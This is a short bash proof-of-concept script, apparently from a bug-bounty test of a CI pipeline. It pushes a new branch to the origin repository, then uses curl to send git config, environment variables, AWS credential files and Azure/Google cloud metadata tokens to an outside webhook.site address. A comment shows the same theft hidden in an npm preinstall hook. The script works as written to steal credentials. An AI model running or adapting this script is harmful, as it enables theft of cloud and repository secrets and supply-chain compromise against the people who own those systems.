#!/usr/bin/env bash
#filename: myscript.sh

echo "-------------poc_hello--------------" >&2


echo "--- creating malicious branch, can easily push to master or release ---" >&2 
git config --global user.email "bh@someemail.com"
git config --global user.name "H1Tester"
git fetch origin >&2
git checkout master >&2
git pull origin master >&2
git checkout -b bh-poc >&2
git add . >&2
git push -u origin bh-poc >&2
echo "--- token extraction ---" >&2 

export webhook="https://webhook.site/testasadasdbh"

#    "preinstall": "curl -X POST -H \"Content-Type: text/plain\" --data \"$(cat .git/config)\" \"https://webhook.site/testasadasdbh/git_config\" && sleep 1200",
curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(cat .git/config)" \
    "$webhook/git_config"
    

curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(git config --list)" \
    "$webhook/git_config_list"


curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(cat /home/runner/.gitconfig)" \
    "$webhook/home_runner_gitconfig"


curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(printenv)" \
  "$webhook/printenv"

curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(cat ~/.aws/cli/cache)" \
  "$webhook/aws_cli_cache"

curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(cat ~/.aws/credentials)" \
  "$webhook/aws_cli_credentials"

curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(curl -H \"Metadata: true\" \"http://169.254.169.254/metadata/instance?api-version=2021-02-01\")" \
  "$webhook/azure_credentials"

curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(curl -s -H "Metadata-Flavor: Google" \"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\")" \
  "$webhook/google_credentials"



git config --list >&2

echo "--- sleeping (in real attack use longer time) ---" >&2
sleep 1200 # in real attack it will be 1200 to have time to edit 
